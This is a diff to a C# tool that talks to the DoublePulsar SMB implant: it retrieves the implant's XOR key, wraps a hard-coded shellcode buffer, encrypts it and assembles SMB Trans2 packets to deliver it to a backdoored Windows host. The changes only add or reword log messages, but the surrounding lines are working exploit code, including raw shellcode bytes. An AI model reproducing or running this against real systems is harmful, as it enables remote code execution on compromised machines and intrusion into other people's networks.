@@ -781,6 +781,7 @@ namespace DoublePulsar
 
             //we need to obtain the key for DoublePulsar so send DoublePulsar trans2 ping packet here
             byte[] pingrequestresponse = DoublepulsarPingRequest(sock, header.UID, header.TID);
+            System.Console.WriteLine("Sent Doublepulsar Ping packet!");
 
             //Receive Trans2 DoublePulsar Response & Parse
             header = SMB_HeaderFromBytes(pingrequestresponse);
@@ -799,6 +800,7 @@ namespace DoublePulsar
 
                 Console.WriteLine("DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: {arch}, XOR Key: {key,4:X}");
                 
+                System.Console.WriteLine("Preparing Doublepulsar payload package!");
                 //insert your shellcode here
                 byte[] buf = new byte[279] {
                   0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
@@ -821,6 +823,7 @@ namespace DoublePulsar
                   0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6e,0x6f,0x74,
                   0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00 };
                     byte[] shellcode = MakeKernelUserPayload(buf);
+                    System.Console.WriteLine("Generating shellcode buffer!");
                 
                     byte[] ByteXORKEY = INT2LE(key);
 
@@ -832,7 +835,7 @@ namespace DoublePulsar
                     System.Console.WriteLine("Shellcode buffer...\n");
                     System.Console.WriteLine(HexDump(SC));
 
-                    System.Console.WriteLine("[+] [{ip}] DOUBLEPULSAR - Encrypting shellcode buffer");
+                    System.Console.WriteLine("[+] [{ip}] DOUBLEPULSAR - Encrypting shellcode buffer with XOR key");
                     System.Console.WriteLine("Encrypting shellcode buffer...\n");
                     for (Int32 i = 0; i < SC.Length; i++)
                     {
@@ -841,6 +844,7 @@ namespace DoublePulsar
 
                     System.Console.WriteLine(HexDump(SC));
 
+                    System.Console.WriteLine("Generating the Doublepulsar parameters...\n");
                     List<byte> Parameters = new List<byte>();
                     Parameters.AddRange(Enumerable.Repeat((byte)0x00, 12));
 
@@ -869,7 +873,6 @@ namespace DoublePulsar
                     }
                     System.Console.WriteLine("Parameters after XOR Encryption...\n");
                     System.Console.WriteLine(HexDump(paramz));
-                    System.Console.WriteLine("[+] [{ip}] DOUBLEPULSAR - Generating parameters...");
                     System.Console.WriteLine("[+] [{ip}] { HexDump(paramz) }");
 
                     SMB_COM_TRANSACTION2_SECONDARY_REQUEST transaction2SecondaryRequest = new SMB_COM_TRANSACTION2_SECONDARY_REQUEST
@@ -933,13 +936,13 @@ namespace DoublePulsar
 
                     System.Console.WriteLine(HexDump(pkt));
 
-                    System.Console.WriteLine("Adding parameters to the end");
+                    System.Console.WriteLine("Adding Doublepulsar parameters to the end");
                     //append the parameteters to the end of pkt
                     pkt = pkt.Concat(paramz.ToArray()).ToArray(); //Collect it all
 
                     System.Console.WriteLine(HexDump(pkt));
 
-                    System.Console.WriteLine("Adding SMB Data to the end");
+                    System.Console.WriteLine("Adding encrypted SMB Data to the end");
                     //append SMBData to the end of pkt
                     pkt = pkt.Concat(SC.ToArray()).ToArray(); //Collect it all
 
